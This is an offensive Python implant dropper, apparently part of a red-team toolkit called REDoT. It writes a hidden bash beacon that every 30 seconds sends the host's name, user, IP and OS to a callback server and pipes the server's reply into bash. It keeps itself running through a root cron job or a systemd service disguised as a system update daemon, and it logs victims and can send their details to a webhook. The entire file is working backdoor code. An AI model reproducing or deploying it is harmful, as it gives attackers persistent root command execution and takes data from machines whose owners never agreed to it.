#!/usr/bin/env python3
"""
implant_dropper.py - REDOT Payload Module
Stealth implant with metadata beaconing, TLS callback, persistence, and agent tracking.
"""

import os
import platform
import socket
import getpass
import uuid
import subprocess
from pathlib import Path
from datetime import datetime

# === Configuration ===
IMPLANT_NAME = "systemd-update"
CALLBACK_HOST = ""  # Auto-detect if empty
CALLBACK_PORT = 8443
PERSIST_METHOD = "cron"  # Options: 'cron' or 'systemd'
INSTALL_DIR = "/tmp/.sys"
AGENT_LOG = "logs/implants/agents.log"
CRON_FILE = "/etc/cron.d/systemd-update"
AGENT_ID_FILE = f"{INSTALL_DIR}/.agent_id"
FALLBACK_DNS = False
WEBHOOK_ALERT = False
WEBHOOK_URL = "https://your.webhook.url"

# === Utilities ===

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_agent_id():
    if not os.path.exists(AGENT_ID_FILE):
        os.makedirs(INSTALL_DIR, exist_ok=True)
        with open(AGENT_ID_FILE, "w") as f:
            aid = f"{uuid.uuid4()}"
            f.write(aid)
            return aid
    else:
        with open(AGENT_ID_FILE, "r") as f:
            return f.read().strip()

def get_metadata():
    return {
        "agent_id": generate_agent_id(),
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "ip": get_local_ip(),
        "os": platform.platform(),
        "timestamp": datetime.now().isoformat()
    }

# === Implant Builder ===

def build_implant(callback_ip, callback_port, metadata):
    beacon_script = f"""#!/bin/bash
while true; do
  curl -sk https://{callback_ip}:{callback_port}/cmd \\
    -H "X-Agent-ID: {metadata['agent_id']}" \\
    -H "X-Host: {metadata['hostname']}" \\
    -H "X-User: {metadata['user']}" \\
    -H "X-IP: {metadata['ip']}" \\
    -H "X-OS: {metadata['os']}" \\
    | bash
  sleep 30
done
"""
    os.makedirs(INSTALL_DIR, exist_ok=True)
    implant_path = os.path.join(INSTALL_DIR, IMPLANT_NAME)
    with open(implant_path, "w") as f:
        f.write(beacon_script)
    os.chmod(implant_path, 0o755)
    return implant_path

# === Persistence ===

def install_cron(implant_path):
    cron_line = f"* * * * * root {implant_path} >/dev/null 2>&1\n"
    with open(CRON_FILE, "w") as f:
        f.write(cron_line)

def install_systemd(implant_path):
    service_file = f"/etc/systemd/system/{IMPLANT_NAME}.service"
    service_content = f"""[Unit]
Description=System Update Daemon
After=network.target

[Service]
ExecStart={implant_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
    with open(service_file, "w") as f:
        f.write(service_content)
    subprocess.run(["systemctl", "daemon-reexec"])
    subprocess.run(["systemctl", "enable", f"{IMPLANT_NAME}.service"])
    subprocess.run(["systemctl", "start", f"{IMPLANT_NAME}.service"])

def install_persistence(implant_path):
    if PERSIST_METHOD == "cron":
        install_cron(implant_path)
    elif PERSIST_METHOD == "systemd":
        install_systemd(implant_path)

# === Agent Tracking ===

def log_agent(metadata):
    os.makedirs(os.path.dirname(AGENT_LOG), exist_ok=True)
    with open(AGENT_LOG, "a") as f:
        f.write(f"{metadata['agent_id']} | {metadata['hostname']} | {metadata['user']} | {metadata['ip']} | {metadata['timestamp']}\n")

def send_webhook(metadata):
    try:
        import requests
        requests.post(WEBHOOK_URL, json=metadata, timeout=3)
    except:
        pass

# === Main Execution ===

def drop_implant():
    print("[*] Deploying REDoT implant...")
    callback_ip = CALLBACK_HOST or get_local_ip()
    metadata = get_metadata()
    implant_path = build_implant(callback_ip, CALLBACK_PORT, metadata)
    install_persistence(implant_path)
    log_agent(metadata)
    if WEBHOOK_ALERT:
        send_webhook(metadata)
    print(f"[✓] Implant deployed. Beaconing to {callback_ip}:{CALLBACK_PORT} every 30s.")

if __name__ == "__main__":
    drop_implant()
